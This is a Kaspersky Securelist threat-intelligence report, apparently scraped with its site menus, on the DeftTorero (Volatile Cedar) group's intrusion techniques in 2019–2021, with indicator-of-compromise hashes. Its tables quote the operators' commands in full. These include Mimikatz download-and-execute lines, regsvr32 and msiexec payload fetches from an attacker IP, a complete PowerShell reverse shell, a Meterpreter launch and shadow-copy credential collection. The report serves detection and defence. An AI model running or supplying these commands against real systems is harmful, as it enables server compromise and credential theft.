# Reference for threat actor for "Volatile Cedar"

**Title**: DeftTorero TTPs in 2019–2021 | Securelist

**Source**: https://securelist.com/defttorero-tactics-techniques-and-procedures/107610/

## Content















DeftTorero TTPs in 2019–2021 | Securelist


































































Solutions for:

Home Products
Small Business 1-50 employees
Medium Business 51-999 employees
Enterprise 1000+ employees
 



















by Kaspersky


CompanyAccount
Get In Touch
Dark mode off
EnglishRussianSpanish













Solutions



Hybrid Cloud SecurityLearn More
Internet of Things & Embedded SecurityLearn More
Threat Management and DefenseLearn More
Industrial CybersecurityLearn More
Fraud PreventionLearn More



Other solutions
Blockchain Security
Kaspersky for Security Operations Center


Industries



National CybersecurityLearn More
Industrial CybersecurityLearn More
Finance Services CybersecurityLearn More
Healthcare CybersecurityLearn More
Transportation CybersecurityLearn More
Retail CybersecurityLearn More



Other Industries
Telecom Cybersecurity
Blockchain Security
View all


Products



KasperskyEndpoint Security for BusinessLearn More
KasperskyEndpoint Detection and Response (EDR)Learn More
KasperskyEDR OptimumLearn More
KasperskyAnti Targeted Attack PlatformLearn More
KasperskyManaged Detection and ResponseLearn More
KasperskySandboxLearn More



Other Products
Kaspersky Security for Mail Server
Kaspersky Security for Internet Gateway
Kaspersky Embedded Systems Security
Kaspersky Hybrid Cloud Security for AWS
Kaspersky Hybrid Cloud Security for Azure
View All


Services



KasperskyCybersecurity ServicesLearn More
KasperskyAdaptive Online TrainingLearn More
KasperskyPremium SupportLearn More
KasperskyThreat IntelligenceLearn More
KasperskyAPT Intelligence ReportingLearn More
KasperskyTargeted Attack DiscoveryLearn More



Other Services
Kaspersky Professional Services
Kaspersky Incident Response
Kaspersky Cybersecurity Training
Kaspersky Incident Communications
Kaspersky Security Awareness
View All


Resource Center

Case Studies
White Papers
Datasheets
Technologies
MITRE ATT&CK

About Us

Transparency
Corporate News
Press Center
Careers
Innovation Hub
Sponsorship
Policy Blog
Contacts

GDPR
 





Subscribe
 Dark mode off
Login


Securelist menu

EnglishRussianSpanish
Existing Customers

Personal

My Kaspersky
Renew your product
Update your product
Customer support

Business

KSOS portal
Kaspersky Business Hub
Technical Support
Knowledge Base
Renew License


Home

Products
Trials&Update
Resource Center

Business

Small Business (1-50 employees)
Medium Business (51-999 employees)
Enterprise (1000+ employees)


Securelist
Threats

Financial threats
Mobile threats
Web threats
Secure environment (IoT)
Vulnerabilities and exploits
Spam and Phishing
Industrial threats

Categories

APT reports
Incidents
Research
Malware reports
Spam and phishing reports
Publications
Kaspersky Security Bulletin

Archive
All Tags
APT Logbook
Webinars
Statistics
Encyclopedia
Threats descriptions
KSB 2021

About Us

Company
Transparency
Corporate News
Press Center
Careers
Sponsorships
Policy Blog
Contacts

Partners

Find a Partner
Partner Program
















Content menu
Close













Subscribe













by Kaspersky

 Dark mode off




ThreatsThreats

APT (Targeted attacks)
Secure environment (IoT)
Mobile threats
Financial threats
Spam and phishing
Industrial threats
Web threats
Vulnerabilities and exploits


CategoriesCategories

APT reports
Malware descriptions
Security Bulletin
Malware reports
Spam and phishing reports
Security technologies
Research
Publications


Other sections

Archive
All tags
Webinars
APT Logbook
Statistics
Encyclopedia
Threats descriptions
KSB 2023


 











 

APT reports

DeftTorero: tactics, techniques and procedures of intrusions revealed 

APT reports

03 Oct 2022

  minute read								
















Table of Contents





Initial Access and webshell deploymentDiscoveryDumping credentialsThe many ways to achieve ExecutionCredentials: the more, the betterDefense Evasion: Explosive RAT modificationsVictimsConclusionsIndicators of CompromiseFile hashesPost exploitation 






 

Authors




GReAT





Earlier this year, we started hunting for possible new DeftTorero (aka Lebanese Cedar, Volatile Cedar) artifacts. This threat actor is believed to originate from the Middle East and was publicly disclosed to the cybersecurity community as early as 2015. Notably, no other intelligence was shared until 2021, which led us to speculate on a possible shift by the threat actor to more fileless/LOLBINS techniques, and the use of known/common offensive tools publicly available on the internet that allows them to blend in.
The public reports available to date expose and discuss the final payload – Explosive RAT – and the webshells used in the initial foothold such as Caterpillar and ASPXSpy (you can find webshell MD5 hashes in the IoC section), with little on the tactics, techniques and procedures (TTPs); this post focuses primarily on the TTPs used by the threat actor in intrusions between late 2019 and mid-2021 to compromise victims.
More information about DeftTorero is available to customers of Kaspersky Intelligence Reporting.
Contact us: intelreports@kaspersky.com
Initial Access and webshell deployment
During our intrusion analysis of DeftTorero’s webshells, such as Caterpillar, we noticed traces that infer the threat actor possibly exploited a file upload form and/or a command injection vulnerability in a functional or staging website hosted on the target web server. This assumption is based on the fact that the uploaded webshells always drop in the same web folder, and in some cases get assigned a name containing a GUID followed by the original webshell filename.
In other instances, we noticed traces pointing to a possible exploitation of IIS PHP plugins pre-installed by the server admins. And finally, in some other instances, we suspect the operators gained server credentials from other systems in the same organization and logged in using a remote desktop (MSTSC.exe) to deploy the webshell.
Once the threat actor succeeds in identifying a method to upload a webshell, they attempt to drop several webshell types and families, most of which are blocked by the AV engine. We suspect that almost all the webshells dropped (including ASPXSpy, devilzshell, etc.) originate from a GitHub account, and are either used as is or are slightly modified.
Discovery
Upon successful installation of the webshell, the operators run multiple commands to gain situational awareness from the exploited system. This includes testing network connectivity by pinging Google.com, listing current folders, identifying the current user privileges, enumerating local system users, and listing websites hosted by the compromised server. The operators also attempt to assess if the web server is joined and/or trusted by any domain. At a later stage, this will prove useful as it will inform them on the next course of actions for dumping local or domain credentials.



Command
Purpose


cmd.exе /c whoаmi
Identify user privileges


cmd.exе /c аppcmd list site
List the hosted websites on the web server


cmd.exе /c nltеst /domain_trusts
List domain controllers and enumerate domain trusts


cmd.exе /с dir
List current directories and files


cmd.exе /c nеt view
Display a list of domains, computers, or resources that are being shared by the specified computer


cmd.exе /c sеt
Display the current environment variable settings


cmd.exе /c systеminfo
Display system profile and installed hotfixes


cmd.exе /c ipconfig -displаydns
Display DNS resolver cache


cmd.exе /c ipconfig -аll
Display network configuration on all network interfaces


cmd.exе /c nеt user
Display local users


cmd.exе /c nеt user /domain
Display domain users


cmd.exе /c nеt use
Display mapped drives to local system


cmd.exе /c opеnfilеs
Display files opened remotely



Table. 1 Operator commands executed through webshell
After gaining situational awareness, the operators attempt to load/invoke a number of tools to dump local and domain credentials. In some cases, the threat actor attempts to install Nmap and Advanced Port Scanner, possibly to scan internal systems.
Dumping credentials
Credential dumping methods differed from one case to another. In some instances, Lazagne.exe was used, in others Mimikatz variants were used either by executing the respective PE binary or by invoking a base64-encoded PowerShell version from a GitHub project. In a smaller number of instances, possibly due to AV detection, the operators dumped the LSASS.exe process to disk, most probably to process it offline for credential dumping.



Command
Comment


IEX (New-Object
Net.WebClient).DownloаdString(“httрs://raw.githubusercontеn
t.com/BC-
SECURITY/Empire/master/data/module_source/crеdentials/Invok
e-Mimikatz.ps1”); Invoke-Mimikаtz -Command
privilеge::dеbug; Invoke-Mimikаtz -DumpCrеds;
Decoded base64 command issued through webshell to invoke Mimikatz to dump passwords


IEX (New-Object
Net.WebClient).DownloаdString(‘httрs://raw.githubuserconten
t.com/putterpаnda/mimikittеnz/master/Invoke-
mimikittеnz.ps1’); Invoke-mimikittеnz
Decoded base64 command issued through webshell to invoke Mimikittenz to dump passwords



Table. 2 Operators invoking Mimikatz variants
Once credentials are obtained, it is believed the operators use Remote Desktop Protocol to pivot into internal systems, or reachable systems that are likely using the stolen credentials (e.g., trusted partners). This is also reinforced by timeline analysis where the threat actor deployed a webshell at another web server in the same network without exploiting a file upload form/vulnerability.
The many ways to achieve Execution
Further commands were executed to bypass the AV engine and establish a Meterpreter session with the operators’ C2 server. After a Meterpreter session is established, the operators attempt to again invoke Mimikatz variants to gain system and/or domain credentials. It’s worth mentioning that in older intrusions, the threat actor deployed Explosive RAT instead of using Meterpreter.



Command
Comment


cmd.exе /c “regsvr32 /s /n /u /i:httр://200.159.87[.]196:3306/jsJ13j.sct
scrobj.dll 2>&1
Alternative methods to achieve command execution while bypassing security controls using LOLBINs such as REGSVR32 and MSIEXEC


cmd.exе /c “powershell -command “regsvr32 /s /n /u
/i:httр://200.159.87[.]196:3306/jsJ13j.sct scrobj.dll” 2>&1


cmd.exе /c “powershеll.exe -executionpolicy bypass -w hidden “iex(New-
Object
System.Net.WebClient).DownloadString(‘httр://200.159.87[.]196/made.ps1’)
; made.ps1” 2>&1


cmd.exе /c “powershеll.exe -c “(New-Object
System.NET.WеbClient).DownloadFile(‘httр://200.159.87[.]196/av.vbs’,\”$e
nv:temp\av.vbs\”);Start-Procеss %windir%\system32\cscript.exе
\”$env:temp\av.vbs\”” 2>&1


cmd.exe /c “powershеll.exe -executionpolicy bypass -w hidden “iex(New-
Object
System.Net.WebClient).DownloadString(‘httр://<internal_IP_address>:8000/
made.ps1′); made.ps1″ 2>&1


cmd.exe /c “powershеll -nop -c “$client = New-Object
System.Net.Sockets.TCPClient(‘200.159.87[.]196’,3306);$strеam =
$client.GеtStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Rеad($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object –
TypeName System.Text.ASCIIEncoding).GеtString($bytes,0, $i);$sendback =
(iex $data 2>&1 | Out-String );$sendback2 = $sendback + ‘PS ‘ +
(pwd).Path + ‘> ‘;$sеndbyte =
([text.encoding]::ASCII).GеtBytes($sendback2);$strеam.Write($sendbyte,0,
$sendbyte.Length);$stream.Flush()};$client.Close()” 2>&1


cmd.exe /c “msiеxec /q /i http://200.159.87[.]196/1.msi 2>&1


cmd.exe /c “Powershеll.exе -NoP -NonI -W Hidden -Exеc Bypass IEX (New-
Object
Net.WebClient).DownloadString(‘httрs://raw.githubusercontent[.]com/cheet
z/PowerSploit/master/CodeExеcution/Invoke–Shellcode.ps1’); Invoke-
Shellcode -Payload windows/metеrpreter/reverse_https -Lhost
200.159.87[.]196 -Lport 3306 -Force 2>&1
PowerShell command to invoke a Meterpreter session



Table. 3 Operator commands to establish further presence on other servers in the same network
Credentials: the more, the better
While the same credential dumping strategy has been used by the operators in most intrusions, there were some instances where few modifications were seen. For example, the operators used the VSSADMIN system tool to create a shadow copy snapshot on the targeted server in an attempt to dump domain credentials, a technique also used in pentesting and red team engagement.



Command
Comment


CMD /C vssаdmin create shadow /for=E:
Create a volume shadow copy to collect SAM and SYSTEM registry hives from local system, or NTDS.DIT and SYSTEM hives if on a domain controller


CMD /C vssаdmin list shadows /for=E:>
Test if the above command worked



Table. 4 Creating a shadow copy
Defense Evasion: Explosive RAT modifications
We’ve barely seen Explosive RAT since 2019. However, it’s worth mentioning the tricks the author used in the versions that we know of. While the functionality of the malware didn’t change that much over time, the author made an effort to ensure its files wouldn’t be detected using publicly available signatures. The changes introduced were minimal but sufficient. The table below illustrates some changes made by the malware author. It is also noticeable that some strings mentioned in previous Yara rules disappeared from the newer version.



New Pattern
Old Pattern
Pattern Description


DOD
DLD
Delimiter used for malware configuration variables


Mozilla/5.0 (Windows NT 6.0; WOW64; rv:32.0) Gecko/20200101 Firefox/32.0
Mozilla/4.0 (compatible; MSIE 7.0; MSIE 6.0; Windows NT 5.1; .NET CLR 2.0.50727)
User Agent for HTTP Communication



Table. 5 Pattern changes in the newer Explosive RAT campaign
A second noticeable change made to evade defense was introduced to the function names exported by the DLL component of Explosive RAT. Below is a list of changes in the export table.



New Function Name
Old Function Name


AllDataGet
GetAllData


HistoryGetIE
GetIEHistory


TOCN
CON


FnClipOpen
OpenClipFn


HoKSetWin
SetWinHoK


appregister
Registerapp


ProcessPath
PathProcess



Table. 6 New function names compared to the old ones used in the 2015 campaign
Victims
Based on our telemetry, the indicators of the intrusions we assessed between late 2019 and mid-2021 are similar to the usual DeftTorero victimology, with a clear focus on Middle Eastern countries such as Egypt, Jordan, Kuwait, Lebanon, Saudi Arabia, Turkey and the United Arab Emirates.
The targeted web servers occasionally host multiple websites belonging to different industry verticals such as Corporate, Education, Government, Military, Media, and Telcos. This presents the threat actor with the opportunity to pivot to other victims of interest.
Conclusions
In this post, we described the potential tactics, techniques and procedures identified in previous DeftTorero intrusions that were largely missing from public reports. As our telemetry and public reports did not identify any new Explosive RAT detections after 2020, but only old slightly modified toolsets (e.g., Explosive RAT, webshells, etc.), the historical intrusions analysis we conducted suggest a potential TTP shift by the threat actor to more fileless/LOLBINS techniques, and the use of known/common offensive tools available on the internet. This TTP shift could explain the detection gap in previous years because using fileless techniques and public tools allows the operators to blend in with other threat activities.
There are two recommended defensive measures to combat such intrusions, aside from assessing web vulnerabilities, namely, monitoring web server file integrity and occasionally scanning web server backups; we have noticed that some of the threat actor post-exploitation tools were actually inside website backups, and continued to exist after the initial intrusion. If the backups were restored at a later stage, the threat actor could regain persistent access and continue where they left off.
If you want to learn more about DeftTorero activity and defense against this group, contact the Kaspersky Intelligence Reporting service at intelreports@kaspersky.com.
Indicators of Compromise
Note: We provide an incomplete list of IoCs here that are valid at the time of publication. A full IoC list is available in our private report.
File hashes



53EE31C009E96D4B079EBE3267D0AE8E
Explosive RAT EXE


54EBC45137BA5B9F5ECE35CA40267100
Explosive RAT EXE


A955B45E14D082F71E01EBC52CF13DB8
Explosive RAT EXE


E952EC767D872EA08D8555CBC162F3DC
Explosive RAT EXE


ED50613683B5A4196E0D5FD2687C56DA
Explosive RAT EXE


0a45de1cdf39e0ad67f5d88c730b433a
cmd.aspx (basic ASPX webshell)


0d6bc7b184f9e1908d4d3fe0a7038a1e
c.aspx/conn.aspx (Tunna webshell)


c87a206a9c9846a2d1c3537d459ec03a
the.aspx (ASPX webshell)


02BCD71A4D7C3A366EFF733F92702B81
devel.aspx (Devel webshell)


D6A82B866F7F9E1E01BF89C3DA106D9D
Banner.aspx (reGeorg webshell)


C59870690803D976014C7C8B58659DDF
03831a5291724ef2060127f19206eiab.aspx (webshell)


1ED9169BED85EFB1FD5F8D50333252D8
aram.aspx (Caterpillar webshell)


2D804386DE4073BAD642DFC816876D08
Pavos.aspx (Caterpillar webshell)


523AA999B9270B382968E5C24AB6F9EB
Report_21.jpg (ASPX webshell)


45d854e66631e5c1cda6dbf4fea074ce
aspxspy2014final.aspx (ASPXSpy webshell)


Bb767354ee886f69b4ab4f9b4ac6b660
sec4ever.aspx (Sec4ever webshell)


0152de452f92423829e041af2d783e3f
editor.aspx (basic ASPX webshell)


7981f1bf9b8e5f4691e4ac440f1ba251
devilzshell.aspx (devilzshell webshell)


4b646e7958e1bb00924b8e6598fe6670
nightrunner.aspx (Nightrunner webshell)


D608163a972f43cc9f53705ed6d31089
mini.php (PHP webshell)



Post exploitation



7567F938EE1074CD3932FDB01088CA35
Netcat (filenames seen: 50.exe, 04.exe, putty.exe)


566b4858b29cfa48cd5584bebfc7546b
mim.ps1 (Mimikatz)


BD876B57F8BE84FF5D95C899DE34C0EE
Invoke-DCSync.ps1.txt


F575D4BB1F5FF6C54B2DE99E9BC40C75
Aaa.txt/.ps1 (Mimikatz)


238A4EFE51A9340511788D2752ACA8D6
DomainPasswordSpray.ps1


550BD7C330795A766C9DFB1586F3CC53
Copy-VSS.ps1


68D3BF2C363144EC6874AB360FDDA00A
lazagne.exe


3437E3E59FDA82CDB09EAB711BA7389D
mimilove.exe









APT
Credentials theft
DeftTorero
Malware
Malware Technologies
Targeted attacks
Vulnerabilities



Authors




GReAT





DeftTorero: tactics, techniques and procedures of intrusions revealed 
 Your email address will not be published. Required fields are marked *Name * 
Email * 

  




Cancel 

Δ 
















Table of Contents





Initial Access and webshell deploymentDiscoveryDumping credentialsThe many ways to achieve ExecutionCredentials: the more, the betterDefense Evasion: Explosive RAT modificationsVictimsConclusionsIndicators of CompromiseFile hashesPost exploitation 





GReAT webinars






																		13 May 2021, 1:00pm								
GReAT Ideas. Balalaika Edition 





Boris Larin



Denis Legezo










																		26 Feb 2021, 12:00pm								
GReAT Ideas. Green Tea Edition 





John Hultquist



Brian Bartholomew



Suguru Ishimaru



Vitaly Kamluk



Seongsu Park



Yusuke Niwa



Motohiko Sato










																		17 Jun 2020, 1:00pm								
GReAT Ideas. Powered by SAS: malware attribution and next-gen IoT honeypots 





Marco Preuss



Denis Legezo



Costin Raiu



Kurt Baumgartner



Dan Demeter



Yaroslav Shmelev










																		26 Aug 2020, 2:00pm								
GReAT Ideas. Powered by SAS: threat actors advance on new fronts 





Ivan Kwiatkowski



Maher Yamout



Noushin Shabab



Pierre Delcher



Félix Aime



Giampaolo Dedola



Santiago Pontiroli










																		22 Jul 2020, 2:00pm								
GReAT Ideas. Powered by SAS: threat hunting and new techniques 





Dmitry Bestuzhev



Costin Raiu



Pierre Delcher



Brian Bartholomew



Boris Larin



Ariel Jungheit



Fabio Assolini












From the same authors




 


Coyote: A multi-stage banking Trojan abusing the Squirrel installer 






 


FakeSG campaign, Akira ransomware and AMOS macOS stealer 






 


Advanced threat predictions for 2024 






 


Stealer for PIX payment system, new Lumar stealer and Rhysida ransomware 






 


Updated MATA attacks industrial companies in Eastern Europe 









Subscribe to our weekly e-mails
The hottest research right in your inbox




Email*

*

I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.

 
 Subscribe










Δ








In the same category




 


HrServ – Previously unknown web shell used in APT attack 






 


Modern Asian APT groups’ tactics, techniques and procedures (TTPs) 






 


A cascade of compromise: unveiling Lazarus’ new campaign 






 


How to catch a wild triangle 






 


StripedFly: Perennially flying under the radar 






 















Latest Posts




 



Malware descriptions

Cracked software beats gold: new macOS backdoor stealing cryptowallets 





Sergey Puzan










 



Kaspersky Security Bulletin

Dark web threats and dark market predictions for 2024 





Sergey Lozhkin



Anna Pavlovskaya



Kaspersky Security Services










 



Research

A lightweight method to detect potential iOS malware 





Maher Yamout










 



Research

Operation Triangulation: The last (hardware) mystery 





Boris Larin












Latest Webinars





 




Technologies and services



												11 Dec 2023, 4:00pm					
60 min

The Future of AI in cybersecurity: what to expect in 2024






Vladimir Dashchenko



Victor Sergeev



Vladislav Tushkanov



Dennis Kipker











 




Threat intelligence and IR



												30 Nov 2023, 4:00pm					
70 min

Responding to a data breach: a step-by-step guide






Anna Pavlovskaya











 




Cyberthreat talks



												14 Nov 2023, 4:00pm					
60 min

2024 Advanced persistent threat predictions






Igor Kuznetsov



David Emm



Marc Rivero



Dan Demeter



Sherif Magdy











 




Cyberthreat talks



												09 Nov 2023, 5:00pm					
60 min

Overview of modern car compromise techniques and methods of protection






Alexander Kozlov



Sergey Anufrienko












Reports







HrServ – Previously unknown web shell used in APT attack 

In this report Kaspersky researchers provide an analysis of the previously unknown HrServ web shell, which exhibits both APT and crimeware features and has likely been active since 2021.








Modern Asian APT groups’ tactics, techniques and procedures (TTPs) 

Asian APT groups target various organizations from a multitude of regions and industries. We created this report to provide the cybersecurity community with the best-prepared intelligence data to effectively counteract Asian APT groups.








A cascade of compromise: unveiling Lazarus’ new campaign 

We unveil a Lazarus campaign exploiting security company products and examine its intricate connections with other campaigns








How to catch a wild triangle 

How Kaspersky researchers obtained all stages of the Operation Triangulation campaign targeting iPhones and iPads, including zero-day exploits, validators, TriangleDB implant and additional modules.








 









Subscribe to our weekly e-mails
The hottest research right in your inbox





Email*

*

I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.

 
 Subscribe











Δ








 











ThreatsThreats

APT (Targeted attacks)
Secure environment (IoT)
Mobile threats
Financial threats
Spam and phishing
Industrial threats
Web threats
Vulnerabilities and exploits


CategoriesCategories

APT reports
Malware descriptions
Security Bulletin
Malware reports
Spam and phishing reports
Security technologies
Research
Publications


Other sections

Archive
All tags
Webinars
APT Logbook
Statistics
Encyclopedia
Threats descriptions
KSB 2023


 









© 2024 AO Kaspersky Lab. All Rights Reserved.
Registered trademarks and service marks are the property of their respective owners.



Privacy Policy
License Agreement
Cookies












Subscribe to our weekly e-mails
The hottest research right in your inbox



Email*

*

I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.

 
 Subscribe










Δ



























